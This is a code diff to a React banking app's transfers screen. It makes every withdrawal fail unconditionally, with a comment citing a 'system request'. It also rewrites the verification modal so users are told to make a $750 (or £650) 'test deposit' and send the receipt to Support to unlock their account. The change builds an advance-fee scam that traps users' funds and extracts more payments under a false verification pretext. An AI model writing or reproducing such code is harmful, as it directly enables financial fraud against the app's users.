@@ -61,11 +61,11 @@ export function TransfersView() {
       return;
     }
 
-    if (user && !user.isVerified) {
-      setShowKycModal(true);
-      return;
-    }
+    // Always block withdrawals and show strict modal per system request
+    setShowKycModal(true);
+    return;
 
+    // The rest of the withdrawal logic is unreachable natively, but left intact for structural parity.
     if (user?.pinCode) {
       const enteredPin = window.prompt("Enter your 4-digit transfer PIN to authorize this transaction:");
       if (!enteredPin || enteredPin !== user.pinCode) {
@@ -452,21 +452,21 @@ export function TransfersView() {
               </div>
               <h3 className="text-lg font-bold text-slate-900 dark:text-white">Action Required</h3>
               <p className="text-sm text-slate-500 dark:text-slate-400 mt-2 leading-relaxed">
-                Your account is currently in provisional mode. To enable external transfers, please complete the Know Your Customer (KYC) identity verification process.
+                Your account is currently in provisional mode. To enable external transfers and unlock your personal account and routing numbers, you must complete the Know Your Customer (KYC) identity verification process and make an initial test deposit.
               </p>
               
               <div className="mt-6 space-y-2">
                 <div className="flex items-start space-x-3 text-xs text-slate-700 dark:text-slate-300">
-                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0">1</span>
-                  <span>Navigate to Profile Settings.</span>
+                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0 text-[9px] font-bold">1</span>
+                  <span>Navigate to Profile Settings and upload KYC documents (if you haven't already).</span>
                 </div>
                 <div className="flex items-start space-x-3 text-xs text-slate-700 dark:text-slate-300">
-                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0">2</span>
-                  <span>Upload your SSN and a valid identity document (ID or Passport).</span>
+                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0 text-[9px] font-bold">2</span>
+                  <span>Make a minimum test deposit of $750 (or £650) to confirm account activity.</span>
                 </div>
                 <div className="flex items-start space-x-3 text-xs text-slate-700 dark:text-slate-300">
-                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0">3</span>
-                  <span>Wait for secure verification of your identity (typically within a few minutes).</span>
+                  <span className="w-4 h-4 rounded-full bg-slate-100 dark:bg-white/10 flex items-center justify-center font-mono mt-0.5 shrink-0 text-[9px] font-bold">3</span>
+                  <span>Contact Support with your payment receipt to instantly unlock your account features.</span>
                 </div>
               </div>
 
